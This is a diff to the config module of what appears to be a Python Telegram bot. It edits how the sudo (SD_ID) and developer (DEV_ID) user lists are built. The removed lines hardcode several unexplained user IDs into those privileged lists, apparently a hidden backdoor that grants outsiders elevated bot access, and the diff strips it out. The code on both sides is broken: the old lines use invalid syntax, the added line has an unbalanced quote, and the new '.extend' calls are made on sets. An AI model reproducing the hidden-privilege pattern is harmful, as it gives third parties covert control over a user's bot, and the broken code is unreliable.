@@ -64,7 +64,7 @@ if ENV:
     OWNER_USERNAME = os.environ.get("OWNER_USERNAME")
 
     try:
-        SD_ID = {int(x) for x in os.environ.get("SD_ID", "").split()}
+        SD_ID = {int(x) for x in os.environ.get("SD_ID", ").split()}
         DEV_ID = {int(x) for x in os.environ.get("DEV_ID", "").split()}
     except ValueError:
         raise Exception("Your SUDO or DEV Users list does not contain valid integers")
@@ -240,13 +240,12 @@ xx = Client(
     workers=min(64, os.cpu_count() + 16),
 )
 
-SD_ID = add.(OWNER_ID + 1351432291)
-DEV_ID = add.(OWNER_ID + 1336770915 + 1900124946 + 5068379667 + 1345333945)
+
+SD_ID.extend(OWNER_ID)
+DEV_ID.extend(OWNER_ID)
 
 CHANNELS = {}
 
-SD_ID = list(SD_ID)
-DEV_ID = list(DEV_ID)
 WHITELIST_ID = list(WHITELIST_ID)
 SUPPORT_ID = list(SUPPORT_ID)
 TIGERS_ID = list(TIGERS_ID)
